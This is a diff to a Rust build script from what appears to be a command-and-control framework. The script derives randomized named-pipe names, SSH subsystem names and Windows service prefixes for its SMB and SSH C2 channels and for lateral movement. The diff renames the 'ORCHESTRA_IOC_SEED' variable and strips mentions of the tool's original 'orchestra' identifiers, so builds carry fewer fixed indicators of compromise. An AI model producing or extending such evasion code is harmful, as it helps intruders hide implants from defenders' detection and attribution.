@@ -5,7 +5,7 @@
 //! deterministically from a seed so that both sides produce the same values.
 //!
 //! Seed source (first available wins):
-//!   1. `ORCHESTRA_IOC_SEED` environment variable (hex-encoded u64)
+//!   1. `SYS_IOC_SEED` environment variable (hex-encoded u64)
 //!   2. Auto-generated from thread RNG
 //!
 //! The seed is emitted back as `cargo:rustc-env` so that downstream build
@@ -75,7 +75,7 @@ impl Xoshiro256 {
 }
 
 fn read_seed() -> u64 {
-    if let Ok(raw) = env::var("ORCHESTRA_IOC_SEED") {
+    if let Ok(raw) = env::var("SYS_IOC_SEED") {
         if let Some(hex) = raw.strip_prefix("0x") {
             return u64::from_str_radix(hex, 16).unwrap_or_else(|_| fallback_seed());
         }
@@ -90,7 +90,7 @@ fn fallback_seed() -> u64 {
         .duration_since(UNIX_EPOCH)
         .unwrap_or_default();
     // Mix time with a hard-coded default so it's never zero but also not
-    // fully predictable.  Operators should set ORCHESTRA_IOC_SEED for
+    // fully predictable.  Operators should set SYS_IOC_SEED for
     // reproducible / synchronised builds.
     t.as_nanos() as u64 ^ 0x4f52434853454344 // "ORCHASECD"
 }
@@ -102,7 +102,7 @@ fn main() {
     let seed = read_seed();
 
     // Emit the seed so build tooling can capture it.
-    println!("cargo:rustc-env=ORCHESTRA_IOC_SEED={:#018x}", seed);
+    println!("cargo:rustc-env=SYS_IOC_SEED={:#018x}", seed);
 
     let mut rng = Xoshiro256::from_seed(seed);
 
@@ -125,10 +125,10 @@ fn main() {
         "/// Auto-generated IoC strings — DO NOT EDIT.\n\
          /// Seed: {seed:#018x}\n\
          ///\n\
-         /// Regenerate with: ORCHESTRA_IOC_SEED={seed:#018x} cargo build\n\n\
-         /// Named pipe name for SMB C2 (replaces hardcoded \"orchestra\").\n\
+         /// Regenerate with: SYS_IOC_SEED={seed:#018x} cargo build\n\n\
+         /// Named pipe name for SMB C2.\n\
          pub const IOC_PIPE_NAME: &str = \"{pipe_name}\";\n\n\
-         /// SSH subsystem name for SSH C2 (replaces hardcoded \"orchestra\").\n\
+         /// SSH subsystem name for SSH C2.\n\
          pub const IOC_SSH_SUBSYSTEM: &str = \"{ssh_subsystem}\";\n\n\
          /// Windows service name prefix for lateral movement (replaces \"orch_\").\n\
          pub const IOC_SERVICE_PREFIX: &str = \"{service_prefix}\";\n\n\
@@ -141,7 +141,7 @@ fn main() {
     fs::write(&dest_path, code).expect("failed to write ioc_strings.rs");
 
     // Rerun if the seed changes.
-    println!("cargo:rerun-if-env-changed=ORCHESTRA_IOC_SEED");
+    println!("cargo:rerun-if-env-changed=SYS_IOC_SEED");
 }
 
 /// Derive an IoC string by advancing the PRNG state with a domain separator.
